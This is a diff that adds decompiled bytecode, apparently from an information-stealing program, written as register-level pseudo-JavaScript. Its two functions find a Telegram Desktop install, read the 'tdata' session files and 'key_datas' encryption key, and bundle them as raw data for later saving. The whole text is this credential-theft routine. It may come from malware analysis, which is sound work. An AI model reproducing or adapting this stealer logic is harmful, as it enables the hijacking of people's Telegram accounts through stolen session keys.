@@ -1,0 +1,170 @@
+function func_extractTelegramData_0x10000b861()
+{
+	r7 = <closure>
+	r8 = <this>
+	ACCU = func_a_0x10000b860
+	try
+	{
+		r11 = 16025
+		r12 = 49821
+		r8 = global_YT["listInstalledApplications"]
+		r0 = r8()
+		r9 = GetIterator(r0)
+		r8 = r9["next"]
+		ACCU = false
+		r10 = false
+		try
+		{
+			while (true)
+			{
+				r10 = true
+				r14 = r8()
+				if (r14["done"]) break
+				r10 = false
+				r5 = r14["value"]
+				r17 = r14["value"]["name"]
+				r18 = "Telegram Desktop"
+				r14 = r14["value"]
+				if (!r17 === r18) continue
+				r15 = r5["install"]
+				if (!r15["location"]) continue
+				r16 = func_extractTelegramSessions_0x1000006f5(r5)
+				r15 = await r16
+				r16 = _GeneratorGetResumeMode(Scope[1497])
+				if (r16 === 0) continue
+				ACCU = r15
+				ACCU = r15
+			}
+			ACCU = -1
+			r12 = -1
+			r11 = -1
+		}
+		catch
+		{
+			r12 = ACCU
+			r11 = 0
+		}
+		if (!r10)
+		{
+			try
+			{
+				if (!r9["return"] == undefined)
+				{
+					ACCU = r9["return"]()
+				}
+				catch {}
+			}
+		}
+		ACCU = null
+		if (r11 === 0)
+		{
+			ACCU = r12
+		}
+		r9 = undefined
+		ACCU = r9
+		return r9
+	}
+	catch {}
+	r8 = ACCU
+	ACCU = null
+	ACCU = Scope[1498]
+	return Scope[1498][2]
+}
+function func_extractTelegramSessions_0x1000006f5(a0)
+{
+	r8 = <closure>
+	r9 = <this>
+	r1 = ACCU
+	try
+	{
+		r0 = a0["install"]
+	}
+	catch
+	{
+		r9 = ACCU
+		ACCU = null
+		ACCU = Scope[10724]
+		r10 = r1
+		return Scope[10724][2]
+	}
+	Scope[10725][3] = func_r_0x1000006f0
+	ACCU = null
+	try
+	{
+		if (!r0["location"])
+		{
+			r10 = r1
+			return undefined
+		}
+		r10 = (require("path"))["join"]
+		r11 = r0["location"]
+		Scope[10725][4] = r10(r11, "tdata")
+		r10 = global_CK["listTelegramSessions"]
+		r11 = r10(Scope[10725][4])
+		r10 = r1
+		r10 = await r11
+		r11 = _GeneratorGetResumeMode(r1)
+		if (!r11 === 0)
+		{
+			ACCU = r10
+		}
+		r4 = r10
+		r10 = (require("fs/promises"))["readFile"]
+		r11 = (require("path"))["join"]
+		r11 = r11(Scope[10725][4], "key_datas")
+		r11 = r10(r11)
+		r10 = r1
+		r10 = await r11
+		r11 = _GeneratorGetResumeMode(r1)
+		if (!r11 === 0)
+		{
+			ACCU = r10
+		}
+		r5 = r10
+		r10 = Promise["allSettled"]
+		r12 = r4["map"]
+		r12 = r12(func_readSessionFile_0x1000006f2)
+		r11 = r10(r12)
+		r10 = r1
+		r10 = await r11
+		r11 = _GeneratorGetResumeMode(r1)
+		if (!r11 === 0)
+		{
+			ACCU = r10
+		}
+		r6 = r10
+		if (!r10["length"])
+		{
+			r10 = r1
+			return undefined
+		}
+		r11 = r6["filter"]
+		r11 = r11(func_isSettledFulfilled_0x1000006f3)
+		r10 = r11["map"]
+		r7 = r10(func_getValue_0x1000006f4)
+		r13 = new {"type": null, "raw": null}
+		r13["type"] = "TELEGRAM_DESKTOP"
+		r14 = new {"key": null, "accounts": null}
+		r14["key"] = r5
+		r14["accounts"] = r7
+		r13["raw"] = r14
+		r11 = func_saveRawApplicationData_0x1000005e5(r13)
+		r10 = r1
+		r10 = await r11
+		r11 = _GeneratorGetResumeMode(r1)
+		if (!r11 === 0)
+		{
+			ACCU = r10
+		}
+		r11 = undefined
+		r10 = r1
+		ACCU = r11
+		return r11
+	}
+	catch {}
+	r10 = ACCU
+	ACCU = null
+	ACCU = Scope[10726]
+	r11 = r1
+	return Scope[10726][2]
+}
